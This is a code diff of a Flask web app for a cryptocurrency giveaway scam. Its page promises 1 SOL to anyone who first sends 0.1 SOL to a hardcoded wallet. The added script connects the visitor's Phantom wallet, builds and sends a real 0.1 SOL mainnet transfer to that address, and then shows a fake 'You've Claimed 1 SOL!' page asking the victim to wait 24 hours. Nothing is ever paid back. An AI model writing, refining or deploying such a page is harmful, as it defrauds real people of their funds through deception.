@@ -1,9 +1,8 @@
-from flask import Flask, render_template_string, request
+from flask import Flask, render_template_string
 
 app = Flask(__name__)
 
 WALLET_ADDRESS = "79vGoijbHkY324wioWsi2uL62dyc1c3H1945Pb71RCVz"
-QR_CODE_URL = "https://raw.githubusercontent.com/markosgiassa1/coinupdater_bot/main/WelcomeCoinUpdater_qrcode.png"
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -11,85 +10,84 @@ HTML_TEMPLATE = """
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>CoinUpdater - Claim Reward</title>
+  <title>Claim 1 SOL</title>
+  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
   <style>
     body {
       background-color: #000;
-      color: #fff;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #00ff90;
+      font-family: Arial, sans-serif;
       text-align: center;
-      padding: 40px;
-      margin: 0;
+      padding-top: 80px;
     }
     h1 {
-      font-size: 2.8rem;
-      margin-bottom: 0.5rem;
+      font-size: 2.2rem;
+      margin-bottom: 20px;
     }
-    p.wallet {
-      font-size: 1.3rem;
-      margin: 1rem 0 3rem;
-      letter-spacing: 1.2px;
-      word-break: break-word;
-    }
-    img.qr {
-      width: 250px;
-      height: 250px;
-      border-radius: 20px;
-      box-shadow: 0 0 15px #00ff90;
-      margin-bottom: 3rem;
-    }
-    a.claim-button {
-      display: inline-block;
-      background: linear-gradient(90deg, #00ff90, #00d178);
+    .btn {
+      background-color: #00ff90;
       color: #000;
+      padding: 15px 35px;
+      font-size: 18px;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      margin-top: 30px;
       font-weight: bold;
-      font-size: 1.4rem;
-      padding: 15px 45px;
-      border-radius: 40px;
-      text-decoration: none;
-      box-shadow: 0 4px 20px #00ff90aa;
-      transition: all 0.3s ease;
+      box-shadow: 0 0 20px #00ff90;
     }
-    a.claim-button:hover {
-      background: linear-gradient(90deg, #00d178, #00ff90);
-      box-shadow: 0 6px 30px #00ff90ff;
-    }
-    .message {
-      margin-top: 3rem;
-      font-size: 1.2rem;
-      color: #00ff90;
-    }
-    footer {
-      margin-top: 5rem;
-      font-size: 0.9rem;
-      color: #444;
+    .btn:hover {
+      background-color: #00e67a;
     }
   </style>
-  <script>
-    function claimReward() {
-      // Open wallet with solana: deep link
-      const txLink = "solana:{{ wallet }}?amount=0.1&label=Claim%201%20SOL&message=Send%200.1%20SOL%20to%20receive%201%20SOL";
-      window.location.href = txLink;
-
-      // After 6 seconds (enough time to confirm), redirect back to show message
-      setTimeout(() => {
-        window.location.href = "/claimed";
-      }, 6000);
-    }
-  </script>
 </head>
 <body>
-  <h1>Claim Your 1 SOL Reward!</h1>
-  <p class="wallet">Send 0.1 SOL to wallet:<br><strong>{{ wallet }}</strong></p>
-  <img src="{{ qr_url }}" alt="QR Code" class="qr" />
-  <br />
-  <a href="javascript:void(0)" onclick="claimReward()" class="claim-button">
-    🚀 Claim 1 SOL Reward
-  </a>
+  <h1>🎁 Claim Your 1 SOL Reward</h1>
+  <p>Connect your wallet and send 0.1 SOL to receive 1 SOL</p>
+  <button class="btn" id="connect-wallet">Connect Wallet & Send</button>
 
-  <footer>
-    &copy; 2025 CoinUpdater Bot
-  </footer>
+  <script>
+    const connectBtn = document.getElementById('connect-wallet');
+    const toPubkey = "{{ wallet_address }}";
+
+    connectBtn.addEventListener('click', async () => {
+      try {
+        if (!window.solana || !window.solana.isPhantom) {
+          alert("Phantom Wallet not detected. Please install Phantom Wallet.");
+          return;
+        }
+
+        // Connect
+        const resp = await window.solana.connect();
+        const sender = resp.publicKey;
+        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+
+        // Create transaction
+        const transaction = new solanaWeb3.Transaction().add(
+          solanaWeb3.SystemProgram.transfer({
+            fromPubkey: sender,
+            toPubkey: new solanaWeb3.PublicKey(toPubkey),
+            lamports: solanaWeb3.LAMPORTS_PER_SOL * 0.1,
+          })
+        );
+
+        transaction.feePayer = sender;
+        let { blockhash } = await connection.getRecentBlockhash();
+        transaction.recentBlockhash = blockhash;
+
+        // Sign and send
+        const signed = await window.solana.signTransaction(transaction);
+        const txid = await connection.sendRawTransaction(signed.serialize());
+        await connection.confirmTransaction(txid);
+
+        // Redirect
+        window.location.href = "/claimed";
+      } catch (err) {
+        console.error(err);
+        alert("Transaction cancelled or failed.");
+      }
+    });
+  </script>
 </body>
 </html>
 """
@@ -98,8 +96,8 @@ CLAIMED_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Claim Submitted</title>
+  <meta charset="UTF-8" />
+  <title>Claimed</title>
   <style>
     body {
       background-color: #000;
@@ -109,34 +107,31 @@ CLAIMED_TEMPLATE = """
       padding-top: 100px;
     }
     h1 {
-      font-size: 2.5rem;
+      font-size: 2.2rem;
     }
     p {
       margin-top: 20px;
-      font-size: 1.2rem;
-      color: #ccc;
+      font-size: 1.1rem;
+      color: #aaa;
     }
     a {
       color: #00ff90;
-      text-decoration: underline;
+      display: inline-block;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
-  <h1>✅ You’ve Claimed 1 SOL!</h1>
-  <p>Please wait patiently for 24 hours. Due to high demand, rewards are being processed in order.</p>
-  <p><a href="/">← Back to Claim Page</a></p>
+  <h1>✅ You've Claimed 1 SOL!</h1>
+  <p>Thank you. Your claim was successful.<br />Please wait 24 hours while your reward is processed.</p>
+  <a href="/">← Back to Claim Page</a>
 </body>
 </html>
 """
 
 @app.route("/")
-def index():
-    return render_template_string(
-        HTML_TEMPLATE,
-        wallet=WALLET_ADDRESS,
-        qr_url=QR_CODE_URL
-    )
+def home():
+    return render_template_string(HTML_TEMPLATE, wallet_address=WALLET_ADDRESS)
 
 @app.route("/claimed")
 def claimed():
